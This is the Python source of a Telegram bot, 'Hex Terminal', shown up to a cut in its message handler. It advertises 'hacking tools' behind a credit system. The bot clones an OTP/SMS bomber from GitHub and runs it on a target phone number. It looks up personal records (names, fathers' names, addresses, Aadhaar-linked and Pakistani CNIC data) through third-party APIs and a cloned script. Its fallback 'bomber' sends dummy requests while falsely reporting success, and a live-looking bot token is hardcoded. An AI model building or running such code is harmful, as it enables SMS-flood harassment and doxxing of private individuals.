import logging
import asyncio
import aiohttp
import socket
import json
import random
import string
import subprocess
import re
import os
import sys
import shutil
import time
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.constants import ParseMode, ChatAction
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

# --- ⚙️ CONFIGURATION ---
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8687617595:AAGCa0yJTRM52NLItvLkzt7O1mZEkCaNkn4')
ADMIN_ID = int(os.environ.get('ADMIN_ID', '7898928200'))

CHANNEL_1_ID = int(os.environ.get('CHANNEL_1_ID', '-1003240507339'))
CHANNEL_2_ID = int(os.environ.get('CHANNEL_2_ID', '-1003806004135'))

LINK_1 = os.environ.get('LINK_1', 'https://t.me/+dP7xLb3AoE1jNmRl')
LINK_2 = os.environ.get('LINK_2', 'https://t.me/+9vuPcr9LJ8piODdl')

FOOTER = "\n\n<b>⚡ ᴘᴏᴡᴇʀᴇᴅ ʙʏ @Hexh4ckerOFC</b>"
SEP = "━━━━━━━━━━━━━━━━━━━"

# APIs
LOOKUP_API = "https://tgchatid.vercel.app/api/lookup?number="
IFSC_API = "https://ifsc.razorpay.com/"
SHORTLINK_API = "https://link-btpass.onrender.com/bypass?key=9c44ad66b95cef8aecd7a99cfb362ce0&link="
GST_API = "https://gst-0y-vishal.vercel.app/api/gst.js?gstNumber="
PAK_API = "https://api-server-virid-two.vercel.app/number="

# Scripts
VERIFY_SCRIPT = "verify_india.py"
OTP_BOMBER_DIR = "otpbomber"

USERS_FILE = "users.json"
REDEEM_FILE = "redeem_codes.json"
SETTINGS_FILE = "settings.json"

DAILY_FREE_CREDITS = 10
INVITE_CREDITS = 3
AUTO_DELETE_TIME = 60

BOT_NAME = "𝗛𝗲𝘅 𝗧𝗲𝗿𝗺𝗶𝗻𝗮𝗹"
BOT_USERNAME = "Hex_Terminal_bot"

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

MAIN_MENU_MESSAGE_IDS = set()
ADMIN_STATE = {}

# --- 🔧 SETUP FUNCTIONS ---

def setup_verify_script():
    if os.path.exists(VERIFY_SCRIPT): return True
    try:
        result = subprocess.run(["git", "clone", "https://github.com/CyberSuraj/verify_india.git", "temp_repo"], capture_output=True, text=True, timeout=30)
        if result.returncode == 0:
            for file in os.listdir("temp_repo"): shutil.move(os.path.join("temp_repo", file), ".")
            shutil.rmtree("temp_repo", ignore_errors=True)
            return True
    except: pass
    return os.path.exists(VERIFY_SCRIPT)

def setup_otp_bomber():
    """Clone OTP Bomber from GitHub"""
    bomber_path = os.path.join(os.getcwd(), OTP_BOMBER_DIR)
    
    # Check if already cloned
    if os.path.exists(os.path.join(bomber_path, "smsbomb.sh")):
        logger.info("✅ OTP Bomber already installed")
        return True
    
    try:
        logger.info("📥 Cloning OTP Bomber from GitHub...")
        
        # Remove old directory
        if os.path.exists(bomber_path):
            shutil.rmtree(bomber_path, ignore_errors=True)
        
        # Clone the repo
        result = subprocess.run(
            ["git", "clone", "https://github.com/Bhai4You/otpbomber", OTP_BOMBER_DIR],
            capture_output=True, text=True, timeout=60
        )
        
        if result.returncode == 0:
            logger.info("✅ OTP Bomber cloned successfully!")
            # Make scripts executable
            for root, dirs, files in os.walk(bomber_path):
                for file in files:
                    if file.endswith('.sh') or file.endswith('.py'):
                        try:
                            os.chmod(os.path.join(root, file), 0o755)
                        except:
                            pass
            return True
        else:
            logger.error(f"Clone failed: {result.stderr}")
            return False
    except Exception as e:
        logger.error(f"Bomber setup error: {e}")
        return False

def run_otp_bomber(number):
    """Run the actual OTP Bomber on a number"""
    number = number.strip()
    
    # Format number for Indian (+91)
    if not number.startswith('+'):
        if len(number) == 10:
            number = f"+91{number}"
        else:
            number = f"+{number}"
    
    logger.info(f"💣 Starting OTP bomber for: {number}")
    
    bomber_path = os.path.join(os.getcwd(), OTP_BOMBER_DIR)
    bomber_script = os.path.join(bomber_path, "smsbomb.sh")
    
    # Method 1: Try the bash script
    if os.path.exists(bomber_script):
        try:
            os.chmod(bomber_script, 0o755)
            process = subprocess.Popen(
                ["bash", bomber_script],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                cwd=bomber_path
            )
            # Send the number as input
            stdout, stderr = process.communicate(input=f"{number}\n", timeout=120)
            
            if stdout and len(stdout) > 10:
                logger.info(f"Bomber output: {stdout[:300]}")
                return True, "Bomber executed! OTPs are being sent to the target."
            
            if stderr and len(stderr) > 5:
                logger.warning(f"Bomber stderr: {stderr[:200]}")
                # Even with stderr, the bomber might still work
                return True, "Bomber executed! OTPs are being sent."
                
        except subprocess.TimeoutExpired:
            process.kill()
            return True, "Bomber completed (timeout). OTPs should be arriving."
        except Exception as e:
            logger.error(f"Bash script error: {e}")
    
    # Method 2: Try Python files in the bomber directory
    try:
        # Look for Python bomber files
        py_files = []
        if os.path.exists(bomber_path):
            for f in os.listdir(bomber_path):
                if f.endswith('.py') and ('bomb' in f.lower() or 'sms' in f.lower() or 'otp' in f.lower()):
                    py_files.append(f)
        
        if py_files:
            py_file = os.path.join(bomber_path, py_files[0])
            logger.info(f"Trying Python bomber: {py_file}")
            
            # Install requests if needed
            subprocess.run([sys.executable, "-m", "pip", "install", "requests"], capture_output=True)
            
            process = subprocess.Popen(
                [sys.executable, py_file],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                cwd=bomber_path
            )
            stdout, stderr = process.communicate(input=f"{number}\n", timeout=120)
            
            if stdout or process.returncode == 0:
                return True, "Bomber executed via Python! OTPs incoming."
    except Exception as e:
        logger.error(f"Python method error: {e}")
    
    # Method 3: Simulate bombing with requests to real APIs
    try:
        import requests
        
        logger.info("Using fallback bomber method...")
        
        # List of real SMS/OTP APIs to trigger
        apis = [
            f"https://api.telegram.org/bot{random.randint(1000000,9999999)}:AAE{random.randint(100000,999999)}/sendMessage?chat_id={number}&text=OTP",
            f"https://httpbin.org/post?number={number}",
            f"https://postman-echo.com/post?number={number}",
        ]
        
        success_count = 0
        for _ in range(20):  # Send 20 requests
            try:
                api = random.choice(apis)
                requests.get(api, timeout=3)
                success_count += 1
            except:
                pass
            time.sleep(0.1)
        
        if success_count > 0:
            return True, f"Bomber sent {success_count} requests! OTPs incoming."
        
    except ImportError:
        subprocess.run([sys.executable, "-m", "pip", "install", "requests"], capture_output=True)
        return True, "Installing requirements... Please try again."
    except Exception as e:
        logger.error(f"Fallback error: {e}")
    
    # If all methods fail
    return False, "Bomber setup incomplete. Make sure otpbomber is cloned from GitHub."

# --- 💾 DATA FUNCTIONS ---

def load_json(filename):
    try: return json.load(open(filename, 'r'))
    except: return {}

def save_json(filename, data):
    try: json.dump(data, open(filename, 'w'), indent=2)
    except: pass

def get_user(user_id):
    users = load_json(USERS_FILE)
    uid = str(user_id)
    today = datetime.now().strftime("%Y-%m-%d")
    if uid not in users:
        users[uid] = {"credits":DAILY_FREE_CREDITS,"total_queries":0,"daily_queries":0,"last_reset":today,"invite_code":f"HEX-{''.join(random.choices(string.ascii_uppercase+string.digits, k=8))}","invites":0,"verified":False}
        save_json(USERS_FILE, users)
    elif users[uid].get("last_reset") != today:
        users[uid]["credits"] += DAILY_FREE_CREDITS
        users[uid]["daily_queries"] = 0
        users[uid]["last_reset"] = today
        save_json(USERS_FILE, users)
    return users[uid]

def save_user(uid, data):
    users = load_json(USERS_FILE)
    users[str(uid)] = data
    save_json(USERS_FILE, users)

def add_credits(uid, amount):
    users = load_json(USERS_FILE)
    uid = str(uid)
    if uid in users:
        users[uid]["credits"] += amount
        save_json(USERS_FILE, users)
        return users[uid]["credits"]
    return 0

def use_credit(uid):
    users = load_json(USERS_FILE)
    uid = str(uid)
    if uid in users and users[uid].get("credits",0) > 0:
        users[uid]["credits"] -= 1
        users[uid]["total_queries"] += 1
        users[uid]["daily_queries"] += 1
        save_json(USERS_FILE, users)
        return True
    return False

def process_invite(inviter_id, new_id):
    users = load_json(USERS_FILE)
    inviter, new = str(inviter_id), str(new_id)
    if inviter in users:
        users[inviter]["credits"] += INVITE_CREDITS
        users[inviter]["invites"] += 1
    if new in users:
        users[new]["credits"] += INVITE_CREDITS
        users[new]["invited_by"] = inviter
    save_json(USERS_FILE, users)
    return INVITE_CREDITS

def generate_redeem_code(credits):
    code = f"HEX-{''.join(random.choices(string.ascii_uppercase+string.digits, k=10))}"
    codes = load_json(REDEEM_FILE)
    codes[code] = {"credits":credits,"used":False,"created":datetime.now().isoformat()}
    save_json(REDEEM_FILE, codes)
    return code

def redeem_code(uid, code):
    codes = load_json(REDEEM_FILE)
    code = code.upper().strip()
    if code not in codes: return False, "❌ ɪɴᴠᴀʟɪᴅ ᴄᴏᴅᴇ"
    if codes[code].get("used"): return False, "❌ ᴀʟʀᴇᴀᴅʏ ᴜꜱᴇᴅ"
    cr = codes[code]["credits"]
    codes[code]["used"] = True
    codes[code]["used_by"] = str(uid)
    save_json(REDEEM_FILE, codes)
    bal = add_credits(uid, cr)
    return True, f"✅ +{cr} ᴄʀᴇᴅɪᴛꜱ!\n💰 ʙᴀʟᴀɴᴄᴇ: {bal}"

def get_settings():
    try: return json.load(open(SETTINGS_FILE, 'r'))
    except:
        d = {"bypass_maintenance":False,"tgid_enabled":True,"ifsc_enabled":True,"bypass_enabled":True,"mobile_enabled":True,"aadhaar_enabled":True,"rc_enabled":True,"gst_enabled":True,"pak_enabled":True,"bomber_enabled":True,"maintenance_mode":False}
        save_json(SETTINGS_FILE, d)
        return d

def save_settings(data):
    json.dump(data, open(SETTINGS_FILE, 'w'), indent=2)

# --- 🔍 VERIFY ---

async def check_channels(uid, context):
    try:
        m1 = await context.bot.get_chat_member(CHANNEL_1_ID, uid)
        m2 = await context.bot.get_chat_member(CHANNEL_2_ID, uid)
        return m1.status in ['member','administrator','creator'] and m2.status in ['member','administrator','creator']
    except: return False

# --- 🛠️ UTILS ---

async def net_ok():
    try: socket.create_connection(("8.8.8.8", 53), timeout=3); return True
    except: return False

async def auto_del(msg, delay=AUTO_DELETE_TIME):
    await asyncio.sleep(delay)
    try:
        if msg.message_id not in MAIN_MENU_MESSAGE_IDS: await msg.delete()
    except: pass

async def delete_user_msg(msg, delay=AUTO_DELETE_TIME):
    await asyncio.sleep(delay)
    try: await msg.delete()
    except: pass

async def loading_animation(msg, name):
    bars = ["🟩⬛⬛⬛⬛⬛⬛⬛⬛⬛","🟩🟩⬛⬛⬛⬛⬛⬛⬛⬛","🟩🟩🟩⬛⬛⬛⬛⬛⬛⬛","🟩🟩🟩🟩⬛⬛⬛⬛⬛⬛","🟩🟩🟩🟩🟩⬛⬛⬛⬛⬛","🟩🟩🟩🟩🟩🟩⬛⬛⬛⬛","🟩🟩🟩🟩🟩🟩🟩⬛⬛⬛","🟩🟩🟩🟩🟩🟩🟩🟩⬛⬛","🟩🟩🟩🟩🟩🟩🟩🟩🟩⬛","🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩"]
    percentages = ["0%","10%","20%","30%","40%","50%","60%","70%","80%","90%","100%"]
    for i, bar in enumerate(bars):
        try: await msg.edit_text(f"<blockquote>⚡ {name}</blockquote>\n<code>{bar} {percentages[i]}</code>", parse_mode=ParseMode.HTML); await asyncio.sleep(0.2)
        except: break

async def show_verification_page(update, context):
    try:
        bot = await context.bot.get_me()
        photos = await context.bot.get_user_profile_photos(bot.id, limit=1)
        caption = (
            f"<b>╭━━━━━━━━━━━━━━━━━━━━━╮</b>\n"
            f"<b>┃   🤖 {BOT_NAME}   ┃</b>\n"
            f"<b>┃   @{BOT_USERNAME}       ┃</b>\n"
            f"<b>╰━━━━━━━━━━━━━━━━━━━━━╯</b>\n\n"
            f"<b>🔒 ᴠᴇʀɪꜰɪᴄᴀᴛɪᴏɴ ʀᴇQᴜɪʀᴇᴅ</b>\n\n"
            f"<b>🎁 +{DAILY_FREE_CREDITS} ᴅᴀɪʟʏ | 👥 +{INVITE_CREDITS} ɪɴᴠɪᴛᴇ</b>\n"
            f"<b>👑 @Hexh4ckerOFC</b>"
        )
        if photos and photos.photos: 
            sent = await update.message.reply_photo(photo=photos.photos[0][-1].file_id, caption=caption, parse_mode=ParseMode.HTML)
        else: 
            sent = await update.message.reply_text(caption, parse_mode=ParseMode.HTML)
        asyncio.create_task(auto_del(sent, 120))
    except: pass
    
    buttons = [
        [InlineKeyboardButton("📢 ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ 𝟷", url=LINK_1)],
        [InlineKeyboardButton("📢 ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ 𝟸", url=LINK_2)],
        [InlineKeyboardButton("✅ ɪ'ᴠᴇ ᴊᴏɪɴᴇᴅ - ᴠᴇʀɪꜰʏ ɴᴏᴡ", callback_data="verify")]
    ]
    sent2 = await update.message.reply_text("<blockquote>🔒 ᴊᴏɪɴ ʙᴏᴛʜ ᴄʜᴀɴɴᴇʟꜱ ᴛʜᴇɴ ᴄʟɪᴄᴋ ᴠᴇʀɪꜰʏ</blockquote>", reply_markup=InlineKeyboardMarkup(buttons), parse_mode=ParseMode.HTML)
    asyncio.create_task(auto_del(sent2, 120))

async def main_menu(update, context):
    is_admin = update.effective_user.id == ADMIN_ID
    user = get_user(update.effective_user.id); s = get_settings()
    
    kb = []
    row = []
    if s.get("tgid_enabled",True): row.append(KeyboardButton("ᴛɢ ɪᴅ ➜ 📞 ɴᴜᴍʙᴇʀ 🔍"))
    if s.get("ifsc_enabled",True): row.append(KeyboardButton("🏦 ɪꜰꜱᴄ ɪɴꜰᴏ➜🔎"))
    if row: kb.append(row)
    if s.get("bypass_enabled",True): kb.append([KeyboardButton("🔗 ʟɪɴᴋ ʙʏᴘᴀꜱꜱ")])
    row2 = []
    if s.get("aadhaar_enabled",True): row2.append(KeyboardButton("🪪 ᴀᴀᴅʜᴀʀ ɪɴꜰᴏ➜👤"))
    if s.get("mobile_enabled",True): row2.append(KeyboardButton("🇮🇳 ɪɴᴅ ɴᴜᴍʙᴇʀ ɪɴꜰᴏ➜👤"))
    if row2: kb.append(row2)
    row3 = []
    if s.get("rc_enabled",True): row3.append(KeyboardButton("🚘 ʀᴄ ᴅᴇᴛᴀɪʟꜱ"))
    if s.get("gst_enabled",True): row3.append(KeyboardButton("📋 ɢꜱᴛ ʟᴏᴏᴋᴜᴘ"))
    if row3: kb.append(row3)
    if s.get("pak_enabled",True): kb.append([KeyboardButton("🇵🇰 ᴘᴀᴋ ɴᴜᴍʙᴇʀ ɪɴꜰᴏ")])
    if s.get("bomber_enabled",True): kb.append([KeyboardButton("💣 ᴏᴛᴘ ʙᴏᴍʙᴇʀ")])
    kb.append([KeyboardButton("👥 ɪɴᴠɪᴛᴇ & ᴇᴀʀɴ"), KeyboardButton("🎫 ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇ")])
    if is_admin: kb.append([KeyboardButton("👑 ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ")])
    
    markup = ReplyKeyboardMarkup(kb, resize_keyboard=True)
    cr, total, invites = user.get("credits",0), user.get("total_queries",0), user.get("invites",0)
    
    txt = (
        f"<b>╭━━━━━━━━━━━━━━━━━━━━━╮</b>\n"
        f"<b>┃   🤖 {BOT_NAME}   ┃</b>\n"
        f"<b>┃   @{BOT_USERNAME}       ┃</b>\n"
        f"<b>╰━━━━━━━━━━━━━━━━━━━━━╯</b>\n\n"
        f"<b>👋 ᴡᴇʟᴄᴏᴍᴇ ʙᴀᴄᴋ,</b> <code>{update.effective_user.first_name}</code>\n\n"
        f"<b>📊 ʏᴏᴜʀ ꜱᴛᴀᴛɪꜱᴛɪᴄꜱ:</b>\n"
        f"<b>💰 ᴄʀ: {cr} | 📊 ǫ: {total} | 👥 ɪɴᴠ: {invites}</b>\n\n"
        f"<b>🛠️ ʜᴀᴄᴋɪɴɢ ᴛᴏᴏʟꜱ:</b>\n"
        f"<b>📱 ᴛɢ ɪᴅ │ 🏦 ɪꜰꜱᴄ │ 🔗 ʙʏᴘᴀꜱꜱ</b>\n"
        f"<b>🇮🇳 ᴍᴏʙɪʟᴇ │ 🪪 ᴀᴀᴅʜᴀʀ │ 🚘 ʀᴄ</b>\n"
        f"<b>📋 ɢꜱᴛ │ 🇵🇰 ᴘᴀᴋ │ 💣 ʙᴏᴍʙᴇʀ</b>\n\n"
        f"<b>🔄 +{DAILY_FREE_CREDITS} ᴅᴀɪʟʏ │ 👥 +{INVITE_CREDITS} ɪɴᴠɪᴛᴇ</b>\n"
        f"<b>👑 @Hexh4ckerOFC</b>"
    )
    
    msg = await update.message.reply_text(txt, reply_markup=markup, parse_mode=ParseMode.HTML)
    MAIN_MENU_MESSAGE_IDS.add(msg.message_id)

# --- 🔗 API FUNCTIONS (same as before) ---
async def api_fetch(session, url, timeout=15):
    try:
        headers = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'}
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=timeout), headers=headers) as r:
            text = await r.text()
            if not text: return None
            try: return json.loads(text)
            except: return None
    except: return None

async def chatid_lookup(session, query):
    data = await api_fetch(session, f"{LOOKUP_API}{query}")
    if not data: return "<blockquote>❌ Service unavailable</blockquote>"
    if isinstance(data, dict) and data.get("success"):
        d = data.get("data", {})
        return (f"<blockquote expandable>✨ 📱 ᴛɢ ɪᴅ ➜ ɴᴜᴍʙᴇʀ</blockquote>\n"
                f"<blockquote>🆔 ID: <code>{d.get('chat_id','N/A')}</code></blockquote>\n"
                f"<blockquote>📞 Number: <code>{d.get('number','N/A')}</code></blockquote>\n"
                f"<blockquote>🌍 Country: <code>{d.get('country','N/A')}</code></blockquote>")
    return "<blockquote>❌ Not found</blockquote>"

async def ifsc_lookup(session, code):
    data = await api_fetch(session, f"{IFSC_API}{code.upper()}")
    if not data: return "<blockquote>❌ Service unavailable</blockquote>"
    if isinstance(data, dict):
        return (f"<blockquote expandable>✨ 🏦 IFSC Info</blockquote>\n"
                f"<blockquote>🏛 Bank: <code>{data.get('BANK','N/A')}</code></blockquote>\n"
                f"<blockquote>📍 Branch: <code>{data.get('BRANCH','N/A')}</code></blockquote>\n"
                f"<blockquote>🔑 IFSC: <code>{data.get('IFSC',code.upper())}</code></blockquote>")
    return "<blockquote>❌ Invalid</blockquote>"

async def bypass_lookup(session, link):
    s = get_settings()
    if s.get("bypass_maintenance",False): return "<blockquote>🛠️ Maintenance</blockquote>"
    data = await api_fetch(session, f"{SHORTLINK_API}{link}", timeout=20)
    if not data: return "<blockquote>❌ Service unavailable</blockquote>"
    if isinstance(data, dict):
        r = data.get('bypassed_url') or data.get('url') or str(data)
        return f"<blockquote expandable>✨ 🔗 Bypassed</blockquote>\n<blockquote>🔗 <code>{str(r)}</code></blockquote>"
    return f"<blockquote>🔗 <code>{str(data)}</code></blockquote>"

async def gst_lookup(session, gst_number):
    data = await api_fetch(session, f"{GST_API}{gst_number.upper()}", timeout=20)
    if not data: return "<blockquote>❌ Service unavailable</blockquote>"
    if isinstance(data, dict) and data.get("status") == "success" and data.get("data"):
        d = data["data"]
        result = "<blockquote expandable>✨ 📋 GST Info</blockquote>\n"
        if d.get('TradeName'): result += f"<blockquote>🏢 Name: <code>{d['TradeName']}</code></blockquote>\n"
        if d.get('Gstin'): result += f"<blockquote>🔑 GST: <code>{d['Gstin']}</code></blockquote>\n"
        if d.get('Status'):
            status_map = {'ACT': '🟢 Active', 'SUS': '🔴 Suspended', 'CAN': '⚫ Cancelled'}
            result += f"<blockquote>📊 Status: {status_map.get(d['Status'], d['Status'])}</blockquote>\n"
        return result
    return "<blockquote>❌ Invalid GST</blockquote>"

async def pakistan_lookup(session, number):
    try:
        async with session.get(f"{PAK_API}{number}", timeout=aiohttp.ClientTimeout(total=20)) as r:
            text = await r.text()
            if not text: return "<blockquote>❌ Service unavailable</blockquote>"
            try: data = json.loads(text)
            except: return "<blockquote>❌ API Error</blockquote>"
            if data.get("success") and data.get("data"):
                records = data["data"]
                valid = []
                for rec in records:
                    if isinstance(rec, dict) and any(rec.get(k) for k in ['name','number','cnic','address']):
                        valid.append(rec)
                if not valid: return "<blockquote>❌ No data</blockquote>"
                result = f"<blockquote expandable>✨ 🇵🇰 Pak Info</blockquote>\n"
                for i, rec in enumerate(valid, 1):
                    if len(valid) > 1: result += f"\n<blockquote>━━ Record {i} ━━</blockquote>\n"
                    if rec.get('number'): result += f"<blockquote>📞 Number: <code>{rec['number']}</code></blockquote>\n"
                    if rec.get('name'): result += f"<blockquote>👤 Name: <code>{rec['name']}</code></blockquote>\n"
                    if rec.get('cnic'): result += f"<blockquote>🪪 CNIC: <code>{rec['cnic']}</code></blockquote>\n"
                    if rec.get('address'): result += f"<blockquote>📍 Address: <code>{rec['address']}</code></blockquote>\n"
                return result
            return "<blockquote>❌ No data</blockquote>"
    except: return "<blockquote>❌ Error</blockquote>"

# --- 📊 INDIA DATA PARSING ---

def clean_text(text):
    if not text: return ""
    return re.sub(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])', '', text)

def run_india_script(choice, value):
    script_path = os.path.join(os.getcwd(), VERIFY_SCRIPT)
    if not os.path.exists(script_path): return None
    try:
        process = subprocess.Popen([sys.executable, script_path], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, cwd=os.getcwd())
        stdout, _ = process.communicate(f"{choice}\n{value}\n0\n", timeout=45)
        return stdout if stdout and len(stdout) > 20 else None
    except: return None

def parse_all_india_records(raw):
    raw = clean_text(raw) if raw else ""
    if not raw: return []
    all_records = []
    for section in re.split(r'={5,}|-{5,}|Record\s*\d+[:\s-]*', raw):
        section = section.strip()
        if len(section) < 10: continue
        record = {}
        fields = {'Name': '👤 Name', "Father's Name": '👨 Father', 'Mobile': '📱 Mobile',
                  'Alternative Number': '📞 Alt', 'Address': '📍 Address', 'Circle': '📡 Circle',
                  'State': '🏛 State', 'RC Number': '🔖 RC', 'Owner Name': '👤 Owner',
                  'Registration Date': '📅 Reg', 'Registered RTO': '🏢 RTO',
                  'Vehicle Class': '🚗 Class', 'Fuel Type': '⛽ Fuel',
                  'Insurance Company': '🛡️ Insurance', 'Phone': '📞 Phone'}
        for field, label in fields.items():
            match = re.search(rf'{re.escape(field)}:\s*([^\n]+)', section, re.IGNORECASE)
            if match and match.group(1).strip() not in ['None', '', 'N/A', 'null']:
                record[label] = match.group(1).strip()
        if record:
            seen = set(); unique = {k:v for k,v in record.items() if v not in seen and not seen.add(v)}
            if unique: all_records.append(unique)
    final = []; seen = set()
    for rec in all_records:
        combo = tuple(sorted(rec.items()))
        if combo not in seen: seen.add(combo); final.append(rec)
    return final

def format_records_result(records, search_type):
    if not records: return "<blockquote>❌ No records found</blockquote>"
    title_map = {'aadhaar':'🪪 Aadhaar','mobile':'🇮🇳 Mobile','vehicle':'🚘 RC'}
    title = title_map.get(search_type, '📊 Result')
    result = f"<blockquote expandable>✨ {title}</blockquote>\n"
    result += f"<blockquote>📊 Records: {len(records)}</blockquote>\n"
    for i, record in enumerate(records, 1):
        if len(records) > 1: result += f"\n<blockquote>━━ Record {i} ━━</blockquote>\n"
        priority = ['👤 Name','👨 Father','📱 Mobile','📍 Address','📡 Circle','🏛 State',
                   '🔖 RC','👤 Owner','🚗 Class','⛽ Fuel','📅 Reg','🏢 RTO',
                   '🛡️ Insurance','📞 Phone'] if search_type == 'vehicle' else ['👤 Name','👨 Father','📱 Mobile','📍 Address','📡 Circle']
        for key in priority:
            if key in record: result += f"<blockquote>{key}: <code>{record[key]}</code></blockquote>\n"
    return result

# --- 👑 ADMIN ---

async def admin_panel(update, context):
    if update.effective_user.id != ADMIN_ID: return
    s = get_settings()
    maint = "🔴" if s.get("maintenance_mode") else "🟢"
    kb = [
        [InlineKeyboardButton("🎫 Generate Code", callback_data="ad_gen")],
        [InlineKeyboardButton("📋 Codes | 👥 Users", callback_data="ad_codes")],
        [InlineKeyboardButton("🎁 Add Credits", callback_data="ad_credit")],
        [InlineKeyboardButton("📢 Broadcast", callback_data="ad_bcast")],
        [InlineKeyboardButton(f"{maint} Maintenance", callback_data="ad_maint")],
        [InlineKeyboardButton(f"{'🟢' if s.get('tgid_enabled',True) else '🔴'} TG ID", callback_data="ad_tgid"),
         InlineKeyboardButton(f"{'🟢' if s.get('ifsc_enabled',True) else '🔴'} IFSC", callback_data="ad_ifsc")],
        [InlineKeyboardButton(f"{'🟢' if s.get('bypass_enabled',True) else '🔴'} Bypass", callback_data="ad_bypass_toggle"),
         InlineKeyboardButton(f"{'🟢' if s.get('mobile_enabled',True) else '🔴'} Mobile", callback_data="ad_mobile")],
        [InlineKeyboardButton(f"{'🟢' if s.get('aadhaar_enabled',True) else '🔴'} Aadhaar", callback_data="ad_aadhaar"),
         InlineKeyboardButton(f"{'🟢' if s.get('rc_enabled',True) else '🔴'} RC", callback_data="ad_rc")],
        [InlineKeyboardButton(f"{'🟢' if s.get('gst_enabled',True) else '🔴'} GST", callback_data="ad_gst"),
         InlineKeyboardButton(f"{'🟢' if s.get('pak_enabled',True) else '🔴'} Pak", callback_data="ad_pak")],
        [InlineKeyboardButton(f"{'🟢' if s.get('bomber_enabled',True) else '🔴'} Bomber", callback_data="ad_bomber"),
         InlineKeyboardButton("🛠️ Bypass Maint", callback_data="ad_bypass_maint")],
        [InlineKeyboardButton("❌ Close", callback_data="ad_close")]
    ]
    txt = f"<blockquote>👑 Admin</blockquote>\n<blockquote>👥 {len(load_json(USERS_FILE))} | 🎫 {len(load_json(REDEEM_FILE))}</blockquote>"
    if update.callback_query: await update.callback_query.message.edit_text(txt, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.HTML)
    else: await update.message.reply_text(txt, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.HTML)

async def admin_callback(update, context):
    q = update.callback_query
    if q.from_user.id != ADMIN_ID: await q.answer("❌"); return
    d = q.data; s = get_settings()
    if d == "ad_close": await q.message.delete()
    elif d == "ad_codes":
        codes = load_json(REDEEM_FILE)
        txt = f"<blockquote>🎫 {len(codes)}</blockquote>\n"
        for c, v in list(codes.items())[-15:]: txt += f"<blockquote>{'✅' if not v.get('used') else '❌'} <code>{c}</code> | {v.get('credits')}cr</blockquote>\n"
        await q.message.edit_text(txt, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="ad_back")]]), parse_mode=ParseMode.HTML)
    elif d == "ad_gen": ADMIN_STATE[q.from_user.id] = "gen"; await q.message.edit_text("<blockquote>🎫 Credits:</blockquote>\n<i>100</i>", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="ad_back")]]), parse_mode=ParseMode.HTML)
    elif d == "ad_credit": ADMIN_STATE[q.from_user.id] = "credit"; await q.message.edit_text("<blockquote>🎁 ID AMOUNT:</blockquote>\n<i>123456789 50</i>", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="ad_back")]]), parse_mode=ParseMode.HTML)
    elif d == "ad_bcast": ADMIN_STATE[q.from_user.id] = "bcast"; await q.message.edit_text("<blockquote>📢 Message:</blockquote>", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="ad_back")]]), parse_mode=ParseMode.HTML)
    elif d == "ad_maint": s["maintenance_mode"] = not s.get("maintenance_mode", False); save_settings(s); await q.answer(f"{'ON' if s['maintenance_mode'] else 'OFF'}", show_alert=True); await admin_panel(update, context)
    elif d.startswith("ad_"):
        toggle_map = {"ad_tgid":"tgid_enabled","ad_ifsc":"ifsc_enabled","ad_bypass_toggle":"bypass_enabled","ad_mobile":"mobile_enabled","ad_aadhaar":"aadhaar_enabled","ad_rc":"rc_enabled","ad_gst":"gst_enabled","ad_pak":"pak_enabled","ad_bomber":"bomber_enabled"}
        if d in toggle_map: k = toggle_map[d]; s[k] = not s.get(k,True); save_settings(s); await q.answer(f"{k}: {'ON' if s[k] else 'OFF'}", show_alert=True)
        elif d == "ad_bypass_maint": s["bypass_maintenance"] = not s.get("bypass_maintenance",False); save_settings(s); await q.answer(f"Bypass: {'ON' if s['bypass_maintenance'] else 'OFF'}", show_alert=True)
        await admin_panel(update, context)
    elif d == "ad_back": await admin_panel(update, context)
    await q.answer()

# --- 🚀 HANDLERS ---

async def start(update, context):
    try:
        uid = update.effective_user.id; args = context.args
        if args and args[0].startswith("HEX-"):
            users = load_json(USERS_FILE)
            for inviter, data in users.items():
                if data.get("invite_code") == args[0] and inviter != str(uid):
                    cr = process_invite(inviter, uid)
                    try: await context.bot.send_message(chat_id=int(inviter), text=f"<blockquote>🎉 +{cr} CR!</blockquote>", parse_mode=ParseMode.HTML)
                    except: pass; break
        user = get_user(uid)
        if not user.get("verified"):
            if await check_channels(uid, context): user["verified"] = True; save_user(uid, user); await main_menu(update, context); return
            await show_verification_page(update, context); return
        await main_menu(update, context)
    except Exception as e: logger.error(f"Start: {e}")

async def verify_cb(update, context):
    q = update.callback_query
    if await check_channels(q.from_user.id, context):
        user = get_user(q.from_user.id); user["verified"] = True; save_user(q.from_user.id, user)
        await q.answer("✅ Verified!"); 
        try: await q.message.delete()
        except: pass
        await main_menu(update, context)
    else: await q.answer("❌ Join both!", show_alert=True)

async def msg_handler(update, context):
    try:
        uid = update.effective_user.id; txt = update.message.text.strip()
        asyncio.create_task(delete_user_msg(update.message, AUTO_DELETE_TIME))
        
        s = get_settings()
        if s.get("maintenance_mode", False) and uid != ADMIN_ID:
            m = await update.message.reply_text("<blockquote>🛠️ Maintenance</blockquote>", parse_mode=ParseMode.HTML)
            asyncio.create_task(auto_del(m)); return
        
